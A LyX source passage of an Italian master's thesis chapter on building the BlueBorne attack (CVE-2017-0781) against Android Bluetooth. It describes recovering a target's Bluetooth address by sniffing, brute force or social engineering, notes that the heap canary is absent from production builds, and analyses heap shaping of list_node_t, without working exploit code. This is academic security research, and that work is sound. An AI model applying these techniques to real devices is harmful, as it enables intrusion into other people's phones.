#LyX 2.2 created this file. For more info see http://www.lyx.org/
\lyxformat 508
\begin_document
\begin_header
\save_transient_properties true
\origin unavailable
\textclass classicthesis
\use_default_options true
\maintain_unincluded_children false
\language italian
\language_package default
\inputencoding utf8
\fontencoding global
\font_roman "default" "default"
\font_sans "default" "default"
\font_typewriter "default" "default"
\font_math "auto" "auto"
\font_default_family default
\use_non_tex_fonts false
\font_sc false
\font_osf false
\font_sf_scale 100 100
\font_tt_scale 100 100
\graphics default
\default_output_format default
\output_sync 0
\bibtex_command default
\index_command default
\paperfontsize default
\spacing single
\use_hyperref false
\papersize default
\use_geometry false
\use_package amsmath 1
\use_package amssymb 1
\use_package cancel 1
\use_package esint 1
\use_package mathdots 1
\use_package mathtools 1
\use_package mhchem 1
\use_package stackrel 1
\use_package stmaryrd 1
\use_package undertilde 1
\cite_engine natbib
\cite_engine_type numerical
\biblio_style plainnat
\use_bibtopic false
\use_indices false
\paperorientation portrait
\suppress_date false
\justification true
\use_refstyle 0
\index Index
\shortcut idx
\color #008000
\end_index
\secnumdepth 2
\tocdepth 2
\paragraph_separation indent
\paragraph_indentation default
\quotes_language english
\papercolumns 1
\papersides 1
\paperpagestyle default
\tracking_changes false
\output_changes false
\html_math_output 0
\html_css_as_file 0
\html_be_strict false
\end_header

\begin_body

\begin_layout Standard
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
begingroup
\end_layout

\begin_layout Plain Layout


\backslash
let
\backslash
clearpage
\backslash
relax
\end_layout

\begin_layout Plain Layout


\backslash
let
\backslash
cleardoublepage
\backslash
relax
\end_layout

\end_inset


\end_layout

\begin_layout Standard
\align right
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/android-dead-guy-logo.png
	display false
	width 2.5cm

\end_inset


\end_layout

\begin_layout Chapter
Costruire il vettore d'attacco
\begin_inset CommandInset label
LatexCommand label
name "ch:build-blueborne-attack-vector"

\end_inset


\end_layout

\begin_layout Section
Il problema della 
\begin_inset Quotes eld
\end_inset

discoverable mode
\begin_inset Quotes erd
\end_inset


\begin_inset CommandInset label
LatexCommand label
name "sec:discoverable-mode-problem"

\end_inset


\end_layout

\begin_layout Standard
Come impostazione predefinita in ormai tutti i dispositivi Android, il Bluetooth
 è acceso e molti utenti preferiscono lasciarlo tale in quanto è un modo
 comodo e veloce di connettere auricolari, 
\emph on
smartwatch
\emph default
 o altri dispositivi.
\end_layout

\begin_layout Standard
In Android, durante tutto il tempo in cui un utente effettua una scansione
 dei dispositivi Bluetooth vicini, risulta lui stesso visibile alla ricerca
 di altri dispositivi.
 In ogni altro caso il dispositivo non è visibile.
 Tuttavia un dispositivo con il Bluetooth attivo, seppur non visibile, è
 sempre in ascolto di traffico di cui è il destinatario.
 Per questa ragione, se si vuole stabilire una connessione con un dispositivo
 si ha la necessita di conoscere solamente il suo 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

BDADDR
\end_layout

\end_inset

.
 Questo meccanismo di funzionamento permette a due dispositivi che sono
 già stati associati di connettersi e comunicare senza dover cambiare le
 impostazioni di visibilità.
 Agli occhi di un attaccante a conoscenza del BDADDR di un dispositivo,
 però, questo meccanismo permette di avere accesso ad una vasta superficie
 d'attacco.
\end_layout

\begin_layout Standard
Supponiamo però che l'attaccante non conosca il BDADDR della vittima, ma
 si trovi fisicamente in prossimità del dispositivo da attaccare.
 Se questo è impostato in modo tale da essere visibile ai dispositivi vicini
 il problema è banale: una semplice scansione darà l'informazione cercata.
\end_layout

\begin_layout Standard
Se il dispositivo non è visibile o non compare tra i risultati della ricerca,
 però, nonstante il problema sia più difficile da risolvere, non è comunque
 impossibile.
\end_layout

\begin_layout Subsection
Sniffare il traffico Bluetooth
\end_layout

\begin_layout Standard
Già dall'Ottobre 2010 è disponibile online 
\begin_inset CommandInset href
LatexCommand href
name "Ubertooth"
target "http://ubertooth.sourceforge.net/"

\end_inset

, una piattaforma (software, hardware e firmware) open source di sviluppo
 wireless che supporta la tecnologia Bluetooth.
 Seguendo le istruzioni sul sito ufficiale del progetto è possibile ottenere
 un adattatore Bluetooth in grado di fare 
\emph on
sniffing
\emph default

\begin_inset Foot
status collapsed

\begin_layout Plain Layout
attività di intercettazione passiva dei dati che transitano in una rete
 telematica o in un mezzo trasmissivo
\end_layout

\end_inset

 di pacchetti Bluetooth anche se diretti ad altri dispositivi.
\end_layout

\begin_layout Standard
Nonostante le connessioni Bluetooth siano cifrate, parti di pacchetto contenenti
 informazioni utili non lo sono.
 Guardando queste parti, e attraverso alcune euristiche che sono state implement
ate nel progetto, è possibile ricavare parzialmente o totalmente il BDADDR
 dei dispositivi nelle vicinanze che stanno attivamente scambiando dei pacchetti
 Bluetooth.
\end_layout

\begin_layout Subsection
Sniffare il traffico WiFi
\end_layout

\begin_layout Standard
Se il dispositivo vittima, nonostante abbia il Bluetooth acceso, non genera
 alcun traffico (non ha connessioni attive con altri dispositivi), è ancora
 possibile provare ad 
\begin_inset Quotes eld
\end_inset

indovinare
\begin_inset Quotes erd
\end_inset

 il suo BDADDR sniffando il traffico WiFi.
 Questo è possibile in quanto l'indirizzo MAC della scheda di rete WiFi
 appare non cifrato durante qualunque scambio di pacchetti.
 Conoscere l'indirizzo MAC della scheda di rete ci può dare delle indicazioni
 su quello che potrebbe essere il BDADDR in quanto è ormai largamente diffusa
 la pratica per cui i produttori di hardware forniscono agli 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

OEM
\end_layout

\end_inset

 adattatori WiFi e Bluetooth con indirizzi rispettivamente MAC e BDADDR
 uguali o al più contigui.
\end_layout

\begin_layout Subsection
Brute-force del BDADDR
\end_layout

\begin_layout Standard
Se il dispositivo vittima non ha connessioni Bluetooth né WiFi attive, o
 se indirizzo MAC e BDADDR non sono correlati, è ancora possibile provare
 ad ottenere il BDADDR utilizzando un approccio brute-force.
 In pratica quello che si fa è generare sequenzialmente o randomicamente
 dei BDADDR validi e con questi provare ad iniziare una connessione verso
 il dispositivo.
 Se il BDADDR generato coincide con quello associato a un dispositivo fisicament
e nelle vicinanze, questo risponderà alla richiesta di connessione (eventualment
e con un messaggio di errore).
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
Un BDADDR è un valore a 
\begin_inset Formula $48$
\end_inset

 bit il ché significa che il numero totale di combinazioni da testare è
 
\begin_inset Formula $2^{48}=281474976710656$
\end_inset

 (circa 
\begin_inset Formula $281,5$
\end_inset

 triliardi).
 Supponendo di poter effettuare 
\begin_inset Formula $1000$
\end_inset

 richieste al secondo
\begin_inset Foot
status collapsed

\begin_layout Plain Layout

\size normal
\emph on
throughput
\emph default
 non realistico, inserito al solo scopo di facilitare la trattazione
\end_layout

\end_inset

, il tempo totale necessario per individuare con certezza l'indirizzo di
 un dispositivo è di circa 
\begin_inset Formula $8919$
\end_inset

 
\series bold
anni
\series default
.
\end_layout

\begin_layout Standard
Possiamo migliorare questo risultato?
\end_layout

\begin_layout Standard
Come mostrato in Figura 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:mac-address-format"

\end_inset

 il BDADDR è suddiviso in 
\begin_inset Formula $6$
\end_inset

 ottetti in cui i primi 
\begin_inset Formula $3$
\end_inset

 sono indicativi della casa produttrice dell'adattatore Bluetooth, mentre
 gli ultimi 
\begin_inset Formula $3$
\end_inset

 sono un identificatore univoco del dispositivo.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement h
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset Graphics
	filename /home/mrnfrancesco/git/master-thesis/gfx/mac-address-format.png
	display false
	width 90col%

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:mac-address-format"

\end_inset

Formato del BDADDR
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
Ad esempio un BDADDR del tipo 
\begin_inset Formula $A0\text{:}91\text{:}69\text{:}XX\text{:}XX\text{:}XX$
\end_inset

 indica un dispositivo LG, qualunque valore assegniamo a 
\begin_inset Formula $XX\text{:}XX\text{:}XX$
\end_inset

.
\end_layout

\begin_layout Standard
Questa semplice considerazione porta il numero totale di tentativi da fare
 per ottenere il BDADDR completo di un dispositivo di cui conosciamo il
 produttore a 
\begin_inset Formula $2^{24}=16777216$
\end_inset

 (circa 
\begin_inset Formula $16,8$
\end_inset

 milioni).
 Una completa trattazione 
\begin_inset CommandInset citation
LatexCommand citep
key "detecting_non_discoverable_bluetooth_devices"

\end_inset

 sull'argomento mostra come nonostante sia necessario tenere in considerazione
 diversi fattori che limitano il numero massimo di richieste al secondo
 che è possibile fare, il tempo si riduce rimanendo al di sotto delle 
\begin_inset Formula $24$
\end_inset

 
\series bold
ore
\series default
.
\end_layout

\begin_layout Standard
Ovviamente ulteriori euristiche o particolari contesti possono contribuire
 ad abbassare il tempo necessario fino all'ordine dei 
\series bold
minuti
\series default
.
\end_layout

\begin_layout Subsection
Ingegneria sociale
\end_layout

\begin_layout Standard
Considerando la necessità di essere fisicamente in prossimità del dispositivo
 da attacare, quindi del suo possessore, non è da escludere la strada dell'ingeg
neria sociale per ottenere il BDADDR del dispositivo.
\end_layout

\begin_layout Standard
In questo caso è necessario entrare in contatto con la vittima e convincerlo:
\end_layout

\begin_layout Itemize
a consegnarci lo smartphone per qualche istante, oppure
\end_layout

\begin_layout Itemize
ad aprire le impostazioni del Bluetooth per rendere automaticamente il dispositi
vo visibile, oppure
\end_layout

\begin_layout Itemize
a scambiarci i contatti utilizzando le 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

VCF
\end_layout

\end_inset

, o vCard
\begin_inset Foot
status collapsed

\begin_layout Plain Layout
Biglietti da visita elettronica contenenti le informazioni di contatto come
 nome, numero telefonico, ecc.
\end_layout

\end_inset

, tramite Bluetooth
\end_layout

\begin_layout Itemize
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
dots
\end_layout

\end_inset


\end_layout

\begin_layout Section
Heap Canary
\end_layout

\begin_layout Standard
I 
\emph on
canary
\emph default
 sono un meccanismo di mitigazione per vulnerabilità di tipo 
\emph on
overflow
\emph default
.
 Si tratta di sequenze note di byte che vengono aggiunte alle strutture
 dati come gli 
\emph on
stack frame
\emph default
 o gli 
\emph on
heap chunk
\emph default
 tra i dati e le strutture di controllo.
\end_layout

\begin_layout Standard
In questo modo se avviene un 
\emph on
overflow
\emph default
 il valore del 
\emph on
canary
\emph default
 viene corrotto ed è possibile interrompere l'esecuzione e gestire l'evento,
 ad esempio invalidando i dati corrotti.
\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement h
wide false
sideways false
status open

\begin_layout Plain Layout
\align center
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colorbitbox}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
rlap{
\backslash
bitbox{#2}{
\backslash
color{#1}
\backslash
rule{
\backslash
width}{
\backslash
height}}}%
\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{#2}{#3}}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
begin{bytefield}[%
\end_layout

\begin_layout Plain Layout

	boxformatting={
\backslash
centering
\backslash
itshape},
\end_layout

\begin_layout Plain Layout

	bitwidth=0.6em]{24}
\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox{1}{
\backslash
scriptsize Dimensione del chunk precedente} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox{18}{
\backslash
scriptsize Dimensione del chunk} &
\end_layout

\begin_layout Plain Layout

		
\backslash
bitbox{2}{
\backslash
scriptsize N} & 
\backslash
bitbox{2}{
\backslash
scriptsize M} & 
\backslash
bitbox{2}{
\backslash
scriptsize P} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
colorbitbox{red!15}{24}{
\backslash
scriptsize 
\backslash
texttt{"tinybird"}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox[ltr]{1}{
\backslash
scriptsize Chunk di dati allocato} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
bitbox[lbr]{16}{} & 
\backslash
colorbitbox{gray!15}{8}{
\backslash
scriptsize 
\backslash
texttt{-- padding --}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
colorbitbox{red!15}{24}{
\backslash
scriptsize 
\backslash
texttt{"tinybird"}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox{1}{
\backslash
scriptsize Dimensione 
\backslash

\backslash
 
\backslash
tiny Inizio del prossimo chunk contiguo} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout


\backslash
end{bytefield}
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:heap-canary"

\end_inset

Illustrazione di un chunk allocato nell'heap con aggiunti i valori canary
\end_layout

\end_inset


\end_layout

\end_inset


\end_layout

\begin_layout Standard
Anche Android implementa questo meccanismo di mitigazione per le strutture
 dell'heap, in particolare aggiungendo la stringa 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

tinybird
\end_layout

\end_inset

 prima e dopo i dati utente (Fig.
 
\begin_inset CommandInset ref
LatexCommand ref
reference "fig:heap-canary"

\end_inset

) come è possibile vedere in 
\begin_inset CommandInset href
LatexCommand href
name "/osi/src/allocation_tracker.c"
target "https://android.googlesource.com/platform/system/bt/+/android-7.1.1_r44/osi/src/allocation_tracker.c#143"

\end_inset

 di cui è riportato un estratto:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

static const char *canary = "tinybird";
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

void *allocation_tracker_notify_alloc(uint8_t allocator_id, void *ptr, size_t
 requested_size) {
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

	char *return_ptr = (char *)ptr;
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

	// Add the canary on both sides
\end_layout

\begin_layout Plain Layout

	memcpy(return_ptr - canary_size, canary, canary_size);
\end_layout

\begin_layout Plain Layout

	memcpy(return_ptr + requested_size, canary, canary_size);
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	return return_ptr;
\end_layout

\begin_layout Plain Layout

}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Quindi, un dubbio lecito che potrebbe essere sollevato dopo la trattazione
 in 
\begin_inset CommandInset ref
LatexCommand nameref
reference "sec:Andorid-RCE-(CVE-2017-0781)"

\end_inset

 
\begin_inset CommandInset ref
LatexCommand vpageref
reference "sec:Andorid-RCE-(CVE-2017-0781)"

\end_inset

 è che il 
\emph on
crash
\emph default
 del servizio Bluetooth avvenga a causa della corruzione del 
\emph on
canary
\emph default
.
\end_layout

\begin_layout Standard
Dopo una semplice analisi notiamo come il 
\emph on
tracker
\emph default
 delle allocazioni che si occupa di inserire e controllare il 
\emph on
canary
\emph default
 è inizializzato con la funzione 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

allocation_tracker_init
\end_layout

\end_inset

 che viene invocata nel file 
\begin_inset CommandInset href
LatexCommand href
name "/btif/src/bluetooth.c"
target "https://android.googlesource.com/platform/system/bt/+/android-7.1.1_r44/btif/src/bluetooth.c#134"

\end_inset

 in cui si nota:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

static int init(bt_callbacks_t *callbacks) {
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

#ifdef BLUEDROID_DEBUG
\end_layout

\begin_layout Plain Layout

	allocation_tracker_init();
\end_layout

\begin_layout Plain Layout

#endif
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Sostanzialmente l'uso del 
\emph on
canary
\emph default
 come meccanismo di mitigazione a protezione dell'heap avviene solo quando
 Android viene compilato per il debug, ma viene eliminato dalle 
\emph on
build
\emph default
 in produzione, quindi non è presente in nessun dispositivo che sia in commercio.
\end_layout

\begin_layout Section
Shaping della memoria
\begin_inset CommandInset label
LatexCommand label
name "sec:memory-shaping"

\end_inset


\end_layout

\begin_layout Standard
Dato quanto detto nella sezione 
\begin_inset CommandInset ref
LatexCommand nameref
reference "sec:Andorid-RCE-(CVE-2017-0781)"

\end_inset

 
\begin_inset CommandInset ref
LatexCommand vpageref
reference "sec:Andorid-RCE-(CVE-2017-0781)"

\end_inset

, è chiaro che è possibile inviare un pacchetto creato 
\emph on
ad-hoc 
\emph default
che sfrutti la vulnerabilità, ma la probabilità che questo abbia successo
 è stata stimata empiricamente essere di circa l'
\begin_inset Formula $1\%$
\end_inset

 (da qui la necessità di inviare 
\begin_inset Formula $500\text{-}1000$
\end_inset

 pacchetti), in caso contrario il servizio Bluetooth va in 
\emph on
crash
\emph default
 e viene automaticamente (e rapidamente) riavviato permettendoci di fare
 tentativi successivi fino al successo.
 Nonostante questo, è conveniente avere un modo che permetta di aumentare
 il tasso di successo durante questa fase dell'attacco, soprattutto perché
 la prossimità fisica di cui necessita l'attacco non è un qualcosa che possiamo
 sempre garantire per lunghi periodi di tempo.
\end_layout

\begin_layout Standard
Continuiamo quindi ad analizzare il flusso di esecuzione a partire dalla
 funzione vulnerabile 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

btu_hci_msg_process
\end_layout

\end_inset

 in modo da comprendere cosa stiamo sovrascrivendo durante l'
\emph on
heap overflow
\emph default
.
\end_layout

\begin_layout Standard
Otteniamo:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

void btu_task_start_up(void *context)
\end_layout

\begin_layout Plain Layout

{
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

	fixed_queue_register_dequeue(btu_hci_msg_queue,
\end_layout

\begin_layout Plain Layout

		thread_get_reactor(bt_workqueue_thread),
\end_layout

\begin_layout Plain Layout

		btu_hci_msg_ready, NULL);
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
quindi:
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

void btu_hci_msg_ready(fixed_queue_t *queue, void *context) {
\end_layout

\begin_layout Plain Layout

	BT_HDR *p_msg = (BT_HDR *)fixed_queue_dequeue(queue);   
\end_layout

\begin_layout Plain Layout

	btu_hci_msg_process(p_msg);
\end_layout

\begin_layout Plain Layout

}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Lo scopo è quello di registrare la funzione 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

btu_hci_msg_process
\end_layout

\end_inset

 in modo che venga invocata per ogni messaggio inserito nella coda 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

btu_hci_msg_queue
\end_layout

\end_inset

 contenente i messaggi destinati al dispositivo provenienti da 
\series bold
tutti
\series default
 i pacchetti derivanti dal controller Bluetooth che poggiano sul protocollo
 
\begin_inset Flex CT - acronym
status collapsed

\begin_layout Plain Layout

HCI
\end_layout

\end_inset

.
 Questo significa che i pacchetti controllati dall'attaccante verranno inseriti
 in questa coda per essere processati.
 I pacchetti relativi all'evento 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

BTU_POST_TO_TASK_NO_GOOD_HORRIBLE_HACK
\end_layout

\end_inset

 visto in precedenza utilizzano la stessa coda per messaggi di tipo diverso,
 che contengono al loro interno una 
\emph on
callback
\emph default
 dinamica.
\end_layout

\begin_layout Standard
\begin_inset VSpace defskip
\end_inset


\end_layout

\begin_layout Standard
Proseguendo nell'analisi delle funzioni invocate otteniamo il buffer che
 viene sovrascritto durante l'
\emph on
overflow
\emph default
 prima che avvenga il 
\emph on
crash
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

void *fixed_queue_dequeue(fixed_queue_t *queue) { 
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

	void *ret = list_front(queue->list);
\end_layout

\begin_layout Plain Layout

	list_remove(queue->list, ret);
\end_layout

\begin_layout Plain Layout

	...
\end_layout

\begin_layout Plain Layout

	return ret;
\end_layout

\begin_layout Plain Layout

}
\end_layout

\end_inset


\end_layout

\begin_layout Standard
L'elemento della lista che viene restituito è di tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_t
\end_layout

\end_inset

, cioè una lista linkata di strutture di tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

.
\end_layout

\begin_layout Standard
Entrambi sono definiti in 
\begin_inset CommandInset href
LatexCommand href
name "/osi/src/list.c"
target "https://android.googlesource.com/platform/system/bt/+/android-7.1.1_r44/osi/src/list.c#7"

\end_inset

 come
\end_layout

\begin_layout Standard
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline false
status open

\begin_layout Plain Layout

struct list_node_t {
\end_layout

\begin_layout Plain Layout

	struct list_node_t *next;
\end_layout

\begin_layout Plain Layout

	void *data;
\end_layout

\begin_layout Plain Layout

};
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

typedef struct list_t {
\end_layout

\begin_layout Plain Layout

	list_node_t *head;
\end_layout

\begin_layout Plain Layout

	list_node_t *tail;
\end_layout

\begin_layout Plain Layout

	size_t length;
\end_layout

\begin_layout Plain Layout

	list_free_cb free_cb;
\end_layout

\begin_layout Plain Layout

	const allocator_t *allocator;
\end_layout

\begin_layout Plain Layout

} list_t;
\end_layout

\end_inset


\end_layout

\begin_layout Standard
Non è un caso che un nodo della lista sia grande esattamente 
\begin_inset Formula $8$
\end_inset

 byte come il buffer con cui facciamo 
\emph on
overflow
\emph default
; infatti, la funzione invocata per allocare memoria nell'
\emph on
heap
\emph default
 (
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

osi_malloc
\end_layout

\end_inset

) è un 
\emph on
wrapper
\emph default

\begin_inset Foot
status collapsed

\begin_layout Plain Layout
Funzione il cui scopo è quello di invocare una seconda funzione o una chiamata
 di sistema dopo aver (eventualmente) effettuato alcune operazioni preliminari
\end_layout

\end_inset

 per la funzione 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

jemalloc
\end_layout

\end_inset

 presente nell'implementazione della libreria standard del C di Android
 che alloca buffer di dimensioni simili in aree di memoria contigue.
\end_layout

\begin_layout Standard
Ricapitolando di nuovo come avviene il 
\emph on
crash
\emph default
 del demone Bluetooth, abbiamo i passi seguenti:
\end_layout

\begin_layout Enumerate
un nodo di tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

 viene inserito nella coda 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

btu_hci_msg_queue
\end_layout

\end_inset

 per essere processato in un secondo momento (Fig.
 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:bnep-heap-with-list-node-before-overflow"

\end_inset

)
\end_layout

\begin_layout Enumerate
il messaggio malevolo di tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

BT_HDR
\end_layout

\end_inset

 viene allocato in un'area di memoria contigua.
 A causa dell'
\emph on
overflow
\emph default
 vengono scritti 
\begin_inset Formula $8$
\end_inset

 byte nell'area di memoria che contiene il nodo di tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

list_node_t
\end_layout

\end_inset

, in particolare sovrascrivendo il puntatore al campo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

data
\end_layout

\end_inset

 (Fig.
 
\begin_inset CommandInset ref
LatexCommand vref
reference "fig:bnep-heap-with-list-node-after-overflow"

\end_inset

)
\end_layout

\begin_layout Enumerate
a quest'ultimo viene applicato un 
\emph on
cast
\emph default

\begin_inset Foot
status collapsed

\begin_layout Plain Layout
conversione di formato
\end_layout

\end_inset

 a tipo 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

BT_HDR
\end_layout

\end_inset

 per essere utilizzato come parametro 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

p_msg
\end_layout

\end_inset

 nella funzione 
\begin_inset listings
lstparams "language={C++},tabsize=4"
inline true
status open

\begin_layout Plain Layout

btu_hci_msg_process
\end_layout

\end_inset


\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colorwordbox}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
rlap{
\backslash
wordbox{#1}{
\backslash
color{#2}
\backslash
rule{
\backslash
width}{
\backslash
height}}}%
\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox{#1}{#3}}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
memsection}[2]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
bytefieldsetup{bitheight=#1
\backslash
baselineskip}%
\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox{1}{#2}%
\end_layout

\begin_layout Plain Layout

}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colormemsection}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
bytefieldsetup{bitheight=#1
\backslash
baselineskip}%
\end_layout

\begin_layout Plain Layout

	
\backslash
colorwordbox{1}{#2}{#3}%
\end_layout

\begin_layout Plain Layout

}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
begin{bytefield}{10}
\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox[]{1}{
\backslash
texttt{btu
\backslash
_hci
\backslash
_msg
\backslash
_queue}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
skippedwords 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox[lrb]{1}{
\backslash
dots} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
colormemsection{10}{gray!15}{
\backslash
texttt{-- non allocato --}} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
begin{leftwordgroup}{
\backslash
texttt{list
\backslash
_node
\backslash
_t}}
\end_layout

\begin_layout Plain Layout

		
\backslash
colormemsection{4}{green!15}{
\backslash
texttt{next} 
\backslash

\backslash
 
\backslash
small 
\backslash
(0
\backslash
)xDEADBEEF} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

		
\backslash
colormemsection{4}{green!15}{
\backslash
texttt{data} 
\backslash

\backslash
 
\backslash
small 
\backslash
(0
\backslash
)x
\backslash
(12345678
\backslash
)}
\end_layout

\begin_layout Plain Layout

	
\backslash
end{leftwordgroup} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox[lrt]{1}{
\backslash
dots} 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout

	
\backslash
skippedwords 
\backslash

\backslash

\end_layout

\begin_layout Plain Layout


\backslash
end{bytefield}
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout
\begin_inset Caption Standard

\begin_layout Plain Layout
\begin_inset CommandInset label
LatexCommand label
name "fig:bnep-heap-with-list-node-before-overflow"

\end_inset

Illustrazione dell'heap prima dell'overflow che porta al crash del demone
 Bluetooth
\end_layout

\end_inset


\end_layout

\begin_layout Plain Layout

\end_layout

\end_inset


\end_layout

\begin_layout Standard
\align center
\begin_inset Float figure
placement H
wide false
sideways false
status open

\begin_layout Plain Layout
\begin_inset ERT
status open

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colorwordbox}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
rlap{
\backslash
wordbox{#1}{
\backslash
color{#2}
\backslash
rule{
\backslash
width}{
\backslash
height}}}%
\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox{#1}{#3}}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
memsection}[2]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
bytefieldsetup{bitheight=#1
\backslash
baselineskip}%
\end_layout

\begin_layout Plain Layout

	
\backslash
wordbox{1}{#2}%
\end_layout

\begin_layout Plain Layout

}
\end_layout

\begin_layout Plain Layout

\end_layout

\begin_layout Plain Layout


\backslash
newcommand{
\backslash
colormemsection}[3]{%
\end_layout

\begin_layout Plain Layout

	
\backslash
bytefieldsetup{bitheight=#1
\backslash
baselineskip}%
\end_layout

\begin_layout Plain Layout

	
\backslash
colorwordbox{1}{#2}{#3}%
\end_layout

